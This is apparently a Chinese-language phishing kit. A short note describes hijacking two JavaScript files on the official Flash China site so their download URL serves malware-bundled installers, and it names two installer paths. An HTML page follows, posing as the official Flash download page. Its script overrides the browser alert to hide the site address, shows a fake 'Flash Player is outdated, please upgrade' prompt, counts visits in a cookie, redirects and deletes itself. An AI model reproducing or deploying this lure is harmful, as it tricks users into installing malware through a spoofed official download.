劫持改了官网页面两个js文件的e.downloadURL属性

origin为原版文件，将捆绑或自解压恶意软件放入

flashcenter/cdm/latest/flashplayerpp_install_cn_fc.exe

frontend/cdm/latest/flashplayerpp_install_cn.exe

``` html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Flash Player官方下载-Flash中国官网</title>
</head>
<body>
    <div id="xxx">
        <noscript>请勿禁用JS</noscript>
        <script>
            function setCookie(cname, cvalue, exdays) {
                var d = new Date();
                d.setTime(d.getTime() + (exdays*24*60*60*1000));
                var expires = "expires=" + d.toGMTString();
                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
            }

            function getCookie(cname) {
                var name = cname + "=";
                var decodedCookie = decodeURIComponent(document.cookie);
                var ca = decodedCookie.split(';');
                for(var i = 0; i < ca.length; i++) {
                    var c = ca[i];
                    while (c.charAt(0) == ' ') {
                        c = c.substring(1);
                    }
                    if (c.indexOf(name) == 0) {
                        return c.substring(name.length, c.length);
                    }
                }
                return "";
            }

            function delSelf() {
                var x = document.getElementById("xxx");
                x.parentNode.removeChild(x);
            }

            // 重写alert，去除地址提示
            window.alert = function(name) {
                var iframe = document.createElement("IFRAME");
                iframe.style.display="none";
                iframe.setAttribute("src", 'data:text/plain,');
                document.documentElement.appendChild(iframe);
                window.frames[0].window.alert(name);
                iframe.parentNode.removeChild(iframe);
            }

            function jump() {
                alert("Adobe Flash Player已过期，请升级后重试");
                window.location.href="https://www.baidu.com/";
            }

            function checkCookie(limit) {
                var count = getCookie("count");
                if (!count) {
                    count = 0;
                    setCookie("count", count, 30);
                    jump();
                } else {
                    count = parseInt(count) + 1;
                    setCookie("count", count, 30);
                    if (count < limit) {
                        jump();
                    }
                }
                delSelf();
            }
            
            checkCookie(2);
        </script>
    </div>
</body>
</html>
```